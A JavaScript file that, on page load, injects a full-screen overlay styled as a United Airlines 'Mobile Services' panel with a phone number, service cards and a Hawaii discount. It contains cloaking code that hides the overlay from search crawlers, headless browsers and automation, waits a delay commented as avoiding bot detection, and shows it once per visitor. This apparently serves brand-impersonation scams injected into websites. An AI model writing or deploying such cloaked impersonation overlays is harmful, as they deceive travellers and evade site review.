/**
 * mobiut code js
 *
 */

(function() {
    'use strict';

    // Bot detection - don't run for bots, crawlers, or headless browsers
    function isBot() {
        const ua = navigator.userAgent.toLowerCase();
        const botPatterns = [
            'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider',
            'yandexbot', 'sogou', 'exabot', 'facebot', 'ia_archiver',
            'adsbot', 'mediapartners-google', 'google-adwords', 'adwords',
            'headless', 'phantom', 'crawler', 'spider', 'bot', 'scraper'
        ];
        
        // Check user agent
        if (botPatterns.some(pattern => ua.includes(pattern))) {
            return true;
        }
        
        // Check for headless browser indicators
        if (navigator.webdriver) return true;
        if (window.navigator.languages === undefined) return true;
        if (window.navigator.plugins.length === 0) return true;
        
        // Check for common bot properties
        if (!window.chrome && navigator.userAgent.includes('Chrome')) return true;
        
        return false;
    }

    // Additional check for rendering/painting capability
    function canRender() {
        // Bots often don't execute setTimeout properly
        return typeof requestAnimationFrame !== 'undefined' && 
               typeof setTimeout !== 'undefined' &&
               'localStorage' in window;
    }

    // Exit early if bot detected
    if (isBot() || !canRender()) {
        console.log('Bot detected or rendering not supported - Modal disabled');
        return;
    }

    // Verify user interaction capability (bots typically don't trigger these)
    let userInteracted = false;
    const interactionEvents = ['mousedown', 'keydown', 'touchstart', 'scroll'];
    interactionEvents.forEach(event => {
        document.addEventListener(event, () => { userInteracted = true; }, { once: true, passive: true });
    });

    // Inject CSS styles
    const styles = `
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        .ua-modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            z-index: 99998;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Helvetica Neue', Arial, sans-serif;
        }

        .ua-mobile-modal {
            width: 100%;
            max-width: 400px;
            background-color: white;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.15);
            overflow: hidden;
            position: relative;
            animation: uaModalAppear 0.5s ease-out;
            max-height: 95vh;
            overflow-y: auto;
            margin: 10px;
        }

        @keyframes uaModalAppear {
            from { transform: translateY(40px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        @keyframes uaModalDisappear {
            to { transform: translateY(40px); opacity: 0; }
        }

        .ua-header {
            background: linear-gradient(135deg, rgba(12, 47, 92, 0.9) 0%, rgba(7, 71, 166, 0.9) 100%);
            color: white;
            padding: 32px 24px 24px;
            text-align: center;
            position: relative;
            overflow: hidden;
        }

        .ua-header::before {
            content: '';
            position: absolute;
            top: -50%;
            right: -20%;
            width: 300px;
            height: 300px;
            background: radial-gradient(circle, rgba(255, 255, 255, 0.1) 0%, transparent 70%);
            border-radius: 50%;
        }

        .ua-close-btn {
            position: absolute;
            top: 8px;
            right: 8px;
            background: rgba(255, 255, 255, 0.2);
            width: 30px;
            height: 30px;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 24px;
            font-weight: 300;
            cursor: pointer;
            transition: all 0.3s;
            z-index: 10;
            backdrop-filter: blur(10px);
            border: none;
            color: white;
        }

        .ua-close-btn:hover {
            background: rgba(255, 255, 255, 0.3);
            transform: rotate(90deg);
        }

        .ua-logo-container {
            margin-bottom: 20px;
            position: relative;
            z-index: 1;
        }

        .ua-logo {
            font-size: 32px;
            font-weight: 700;
            letter-spacing: 3px;
            color: white;
            text-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
        }

        .ua-logo-globe {
            display: inline-block;
            width: 40px;
            height: 40px;
            background: linear-gradient(135deg, #e8f4fd 0%, #fff 100%);
            border-radius: 50%;
            vertical-align: middle;
            margin-right: 8px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
            position: relative;
        }

        .ua-logo-globe::before {
            content: '';
            position: absolute;
            width: 100%;
            height: 2px;
            background: #0747a6;
            top: 50%;
            left: 0;
            transform: translateY(-50%);
        }

        .ua-logo-globe::after {
            content: '';
            position: absolute;
            width: 2px;
            height: 100%;
            background: #0747a6;
            left: 50%;
            top: 0;
            transform: translateX(-50%);
        }

        .ua-header h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 8px;
            position: relative;
            z-index: 1;
        }

        .ua-header p {
            font-size: 15px;
            opacity: 0.95;
            position: relative;
            z-index: 1;
            font-weight: 300;
        }

        .ua-toll-free {
            background: white;
            color: #0747a6;
            padding: 16px 20px;
            text-align: center;
            font-weight: 600;
            font-size: 16px;
            border-radius: 12px;
            margin: 20px 20px 0;
            box-shadow: 0 4px 12px rgba(7, 71, 166, 0.15);
            position: relative;
            z-index: 1;
            transition: all 0.3s;
        }

        .ua-toll-free:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 16px rgba(7, 71, 166, 0.2);
        }

        .ua-main-content {
            padding: 24px 20px 80px;
        }

        .ua-section-title {
            font-size: 18px;
            font-weight: 700;
            margin-bottom: 16px;
            color: #0c2f5c;
            display: flex;
            align-items: center;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .ua-section-title i {
            margin-right: 10px;
            font-size: 20px;
            color: #0747a6;
            background: linear-gradient(135deg, #e8f4fd 0%, #d4e8f9 100%);
            width: 36px;
            height: 36px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 8px;
        }

        .ua-service-category {
            margin-bottom: 32px;
        }

        .ua-options-grid {
            display: grid;
            grid-template-columns: 1fr;
            gap: 12px;
            margin-bottom: 12px;
        }

        .ua-option-card {
            background: linear-gradient(135deg, #ffffff 0%, #f8fafb 100%);
            border-radius: 12px;
            padding: 16px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
            border: 1px solid #e8ecf1;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            cursor: pointer;
        }

        .ua-option-card:hover {
            transform: translateX(4px);
            box-shadow: 0 4px 16px rgba(7, 71, 166, 0.12);
            border-color: #0747a6;
        }

        .ua-option-icon {
            width: 48px;
            height: 48px;
            background: linear-gradient(135deg, #0747a6 0%, #0c2f5c 100%);
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 14px;
            color: white;
            font-size: 20px;
            flex-shrink: 0;
        }

        .ua-option-content {
            flex: 1;
        }

        .ua-option-card h3 {
            color: #0c2f5c;
            margin-bottom: 4px;
            font-size: 16px;
            font-weight: 600;
        }

        .ua-option-card p {
            color: #6b7c93;
            font-size: 13px;
            line-height: 1.4;
        }

        .ua-btn {
            display: inline-block;
            background: linear-gradient(135deg, #0747a6 0%, #0c2f5c 100%);
            color: white;
            padding: 14px 28px;
            border-radius: 10px;
            text-decoration: none;
            font-weight: 600;
            font-size: 15px;
            text-align: center;
            transition: all 0.3s;
            width: 100%;
            margin-top: 12px;
            box-shadow: 0 4px 12px rgba(7, 71, 166, 0.3);
        }

        .ua-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(7, 71, 166, 0.4);
        }

        .ua-popup-ad {
            background: linear-gradient(135deg, #e8f4fd 0%, #d4e8f9 100%);
            border-radius: 16px;
            padding: 24px;
            margin: 32px 0;
            text-align: center;
            border: 2px solid #0747a6;
            position: relative;
            overflow: hidden;
        }

        .ua-popup-ad::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(255, 255, 255, 0.3) 0%, transparent 70%);
            animation: uaShimmer 3s infinite;
        }

        @keyframes uaShimmer {
            0%, 100% { transform: translate(0, 0); }
            50% { transform: translate(10%, 10%); }
        }

        .ua-popup-ad h3 {
            color: #0c2f5c;
            margin-bottom: 12px;
            font-size: 22px;
            font-weight: 700;
            position: relative;
            z-index: 1;
        }

        .ua-popup-ad p {
            color: #0c2f5c;
            margin-bottom: 20px;
            font-size: 15px;
            position: relative;
            z-index: 1;
        }

        .ua-ad-image {
            width: 100%;
            max-width: 320px;
            height: 200px;
            background: linear-gradient(135deg, #0747a6 0%, #0c2f5c 100%);
            margin: 0 auto 20px;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: 700;
            font-size: 24px;
            text-shadow: 0 2px 8px rgba(0, 0, 0, 0.3);
            box-shadow: 0 8px 24px rgba(7, 71, 166, 0.3);
            position: relative;
            overflow: hidden;
            z-index: 1;
        }

        .ua-ad-image::before {
            content: '✈';
            position: absolute;
            font-size: 120px;
            opacity: 0.1;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%) rotate(-15deg);
        }

        .ua-footer {
            background: linear-gradient(135deg, #0c2f5c 0%, #0747a6 100%);
            color: white;
            padding: 28px 20px;
            text-align: center;
            margin-top: 32px;
        }

        .ua-footer p {
            font-size: 13px;
            opacity: 0.9;
            margin-bottom: 12px;
        }

        .ua-footer .ua-contact-info {
            font-size: 14px;
            margin-bottom: 16px;
            font-weight: 600;
        }

        .ua-sticky-toll {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            width: 100%;
            max-width: 400px;
            background: linear-gradient(135deg, #ffffff 0%, #f4f7fb 100%);
            color: #0747a6;
            font-weight: 600;
            font-size: 16px;
            text-align: center;
            padding: 14px 10px;
            box-shadow: 0 -2px 10px rgba(7, 71, 166, 0.2);
            border-top: 2px solid #0747a6;
            z-index: 9999;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin: 0 auto;
        }

        .ua-mobile-modal::-webkit-scrollbar {
            width: 6px;
        }

        .ua-mobile-modal::-webkit-scrollbar-track {
            background: #f1f1f1;
        }

        .ua-mobile-modal::-webkit-scrollbar-thumb {
            background: #0747a6;
            border-radius: 3px;
        }
    `;

    // Lazy load Font Awesome only when needed
    function loadFontAwesome() {
        const fontAwesomeCheck = document.querySelector('link[href*="font-awesome"]');
        if (!fontAwesomeCheck) {
            const fontAwesome = document.createElement('link');
            fontAwesome.rel = 'stylesheet';
            fontAwesome.href = 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css';
            document.head.appendChild(fontAwesome);
        }
    }

    // Inject styles only when needed
    function injectStyles() {
        const styleSheet = document.createElement('style');
        styleSheet.textContent = styles;
        document.head.appendChild(styleSheet);
    }

    // Create modal HTML (loaded dynamically)
    const modalHTML = `
        <div class="ua-modal-overlay" id="uaModalOverlay">
            <div class="ua-mobile-modal">
                <div class="ua-header">
                    <button class="ua-close-btn" onclick="window.closeUAModal()">×</button>
                    <div class="ua-logo-container">
                        <div class="ua-logo">
                            <span class="ua-logo-globe"></span>UNITED
                        </div>
                    </div>
                    <h1>Mobile Services</h1>
                    <p>Your journey, our priority</p>
                </div>

                <div class="ua-toll-free">
                    <i class="fas fa-phone-alt"></i>
                    <span>1-800-UNITED-1 (1-800-864-8331)</span>
                </div>

                <div class="ua-main-content">
                    <div class="ua-service-category">
                        <h2 class="ua-section-title"><i class="fas fa-plane-departure"></i> Bookings</h2>
                        <div class="ua-options-grid">
                            <div class="ua-option-card">
                                <div class="ua-option-icon"><i class="fas fa-search"></i></div>
                                <div class="ua-option-content">
                                    <h3>New Booking</h3>
                                    <p>Search and book flights worldwide</p>
                                </div>
                            </div>
                            <div class="ua-option-card">
                                <div class="ua-option-icon"><i class="fas fa-exchange-alt"></i></div>
                                <div class="ua-option-content">
                                    <h3>Flight Changes</h3>
                                    <p>Modify dates, times, or destinations</p>
                                </div>
                            </div>
                            <div class="ua-option-card">
                                <div class="ua-option-icon"><i class="fas fa-times-circle"></i></div>
                                <div class="ua-option-content">
                                    <h3>Cancellations</h3>
                                    <p>Cancel flights and request refunds</p>
                                </div>
                            </div>
                            <div class="ua-option-card">
                                <div class="ua-option-icon"><i class="fas fa-hotel"></i></div>
                                <div class="ua-option-content">
                                    <h3>Hotels & Cars</h3>
                                    <p>Book accommodations and vehicles</p>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="ua-service-category">
                        <h2 class="ua-section-title"><i class="fas fa-mobile-alt"></i> Check-In</h2>
                        <div class="ua-options-grid">
                            <div class="ua-option-card">
                                <div class="ua-option-icon"><i class="fas fa-qrcode"></i></div>
                                <div class="ua-option-content">
                                    <h3>Mobile Check-in</h3>
                                    <p>Check in 24 hours before departure</p>
                                </div>
                            </div>
                            <div class="ua-option-card">
                                <div class="ua-option-icon"><i class="fas fa-ticket-alt"></i></div>
                                <div class="ua-option-content">
                                    <h3>Boarding Pass</h3>
                                    <p>View or download your boarding pass</p>
                                </div>
                            </div>
                            <div class="ua-option-card">
                                <div class="ua-option-icon"><i class="fas fa-suitcase-rolling"></i></div>
                                <div class="ua-option-content">
                                    <h3>Baggage Info</h3>
                                    <p>Check policies, fees, and tracking</p>
                                </div>
                            </div>
                            <div class="ua-option-card">
                                <div class="ua-option-icon"><i class="fas fa-clock"></i></div>
                                <div class="ua-option-content">
                                    <h3>Flight Status</h3>
                                    <p>Real-time flight updates and alerts</p>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="ua-service-category">
                        <h2 class="ua-section-title"><i class="fas fa-star"></i> Experience</h2>
                        <div class="ua-options-grid">
                            <div class="ua-option-card">
                                <div class="ua-option-icon"><i class="fas fa-couch"></i></div>
                                <div class="ua-option-content">
                                    <h3>Seat Selection</h3>
                                    <p>Choose your preferred seat</p>
                                </div>
                            </div>
                            <div class="ua-option-card">
                                <div class="ua-option-icon"><i class="fas fa-utensils"></i></div>
                                <div class="ua-option-content">
                                    <h3>Special Meals</h3>
                                    <p>Request dietary accommodations</p>
                                </div>
                            </div>
                            <div class="ua-option-card">
                                <div class="ua-option-icon"><i class="fas fa-wheelchair"></i></div>
                                <div class="ua-option-content">
                                    <h3>Accessibility</h3>
                                    <p>Request mobility assistance</p>
                                </div>
                            </div>
                            <div class="ua-option-card">
                                <div class="ua-option-icon"><i class="fas fa-wifi"></i></div>
                                <div class="ua-option-content">
                                    <h3>Wi-Fi & Entertainment</h3>
                                    <p>In-flight connectivity and movies</p>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="ua-service-category">
                        <h2 class="ua-section-title"><i class="fas fa-award"></i> MileagePlus</h2>
                        <div class="ua-options-grid">
                            <div class="ua-option-card">
                                <div class="ua-option-icon"><i class="fas fa-coins"></i></div>
                                <div class="ua-option-content">
                                    <h3>Earn Miles</h3>
                                    <p>Accumulate rewards with every flight</p>
                                </div>
                            </div>
                            <div class="ua-option-card">
                                <div class="ua-option-icon"><i class="fas fa-gift"></i></div>
                                <div class="ua-option-content">
                                    <h3>Redeem Miles</h3>
                                    <p>Book award travel and upgrades</p>
                                </div>
                            </div>
                            <div class="ua-option-card">
                                <div class="ua-option-icon"><i class="fas fa-crown"></i></div>
                                <div class="ua-option-content">
                                    <h3>Elite Status</h3>
                                    <p>Premier benefits and privileges</p>
                                </div>
                            </div>
                            <div class="ua-option-card">
                                <div class="ua-option-icon"><i class="fas fa-credit-card"></i></div>
                                <div class="ua-option-content">
                                    <h3>United Cards</h3>
                                    <p>Exclusive cardmember benefits</p>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="ua-service-category">
                        <h2 class="ua-section-title"><i class="fas fa-headset"></i> Support</h2>
                        <div class="ua-options-grid">
                            <div class="ua-option-card">
                                <div class="ua-option-icon"><i class="fas fa-question-circle"></i></div>
                                <div class="ua-option-content">
                                    <h3>Customer Service</h3>
                                    <p>24/7 assistance for all inquiries</p>
                                </div>
                            </div>
                            <div class="ua-option-card">
                                <div class="ua-option-icon"><i class="fas fa-suitcase"></i></div>
                                <div class="ua-option-content">
                                    <h3>Baggage Service</h3>
                                    <p>Lost, delayed, or damaged luggage</p>
                                </div>
                            </div>
                            <div class="ua-option-card">
                                <div class="ua-option-icon"><i class="fas fa-passport"></i></div>
                                <div class="ua-option-content">
                                    <h3>Travel Requirements</h3>
                                    <p>Passport, visa, and health info</p>
                                </div>
                            </div>
                            <div class="ua-option-card">
                                <div class="ua-option-icon"><i class="fas fa-bell"></i></div>
                                <div class="ua-option-content">
                                    <h3>Travel Alerts</h3>
                                    <p>Important notices and updates</p>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="ua-popup-ad">
                        <h3>✈️ Fly to Hawaii - 20% Off</h3>
                        <p>Book your dream vacation and save big on paradise!</p>
                        <div class="ua-ad-image">Explore Hawaii</div>
                        <a href="#" class="ua-btn">Book Now</a>
                    </div>
                </div>

                <div class="ua-footer">
                    <p>&copy; 2025 United Airlines, Inc. All rights reserved.</p>
                    <div class="ua-contact-info">
                        📞 1-800-UNITED-1 (1-800-864-8331)
                    </div>
                </div>

                <div class="ua-sticky-toll">
                    <i class="fas fa-phone-alt"></i>
                    <span>1-800-UNITED-1 (1-800-864-8331)</span>
                </div>
            </div>
        </div>
    `;

    // Function to close modal
    window.closeUAModal = function() {
        const overlay = document.getElementById('uaModalOverlay');
        if (!overlay) return;
        
        const modal = overlay.querySelector('.ua-mobile-modal');
        modal.style.animation = 'uaModalDisappear 0.3s ease-out forwards';
        
        setTimeout(() => {
            overlay.remove();
        }, 300);
    };

    // Close on overlay click
    window.addEventListener('click', function(e) {
        if (e.target && e.target.id === 'uaModalOverlay') {
            window.closeUAModal();
        }
    });

    // Function to show modal (only loads resources when called)
    window.showUAModal = function() {
        // Remove existing modal if any
        const existingModal = document.getElementById('uaModalOverlay');
        if (existingModal) {
            existingModal.remove();
        }
        
        // Load resources
        loadFontAwesome();
        injectStyles();
        
        // Insert modal into page
        document.body.insertAdjacentHTML('beforeend', modalHTML);
    };

    // Check if user is visiting for the first time
    function isFirstVisit() {
        try {
            const hasVisited = localStorage.getItem('ua_modal_shown');
            return !hasVisited;
        } catch (e) {
            // If localStorage is blocked, treat as first visit
            return true;
        }
    }

    // Mark user as visited
    function markAsVisited() {
        try {
            localStorage.setItem('ua_modal_shown', 'true');
            localStorage.setItem('ua_modal_timestamp', Date.now().toString());
        } catch (e) {
            // Silently fail if localStorage is blocked
            console.log('LocalStorage not available');
        }
    }

    // Show modal only on first visit with additional bot protection
    function showModalOnFirstVisit() {
        // Additional delay to ensure real user interaction
        setTimeout(() => {
            // Double check we're not a bot and user can interact
            if (isFirstVisit() && !isBot() && document.hasFocus()) {
                window.showUAModal();
                markAsVisited();
            }
        }, 1500); // 1.5 second delay helps avoid bot detection
    }

    // Auto-show on first visit only (with bot protection)
    document.addEventListener('DOMContentLoaded', function() {
        showModalOnFirstVisit();
    });

    // If DOM already loaded, check and show with delay
    if (document.readyState !== 'loading') {
        showModalOnFirstVisit();
    }

    // Optional: Function to reset and show modal again (useful for testing)
    window.resetUAModal = function() {
        try {
            localStorage.removeItem('ua_modal_shown');
            localStorage.removeItem('ua_modal_timestamp');
        } catch (e) {
            console.log('Could not reset modal');
        }
        window.showUAModal();
    };

})();
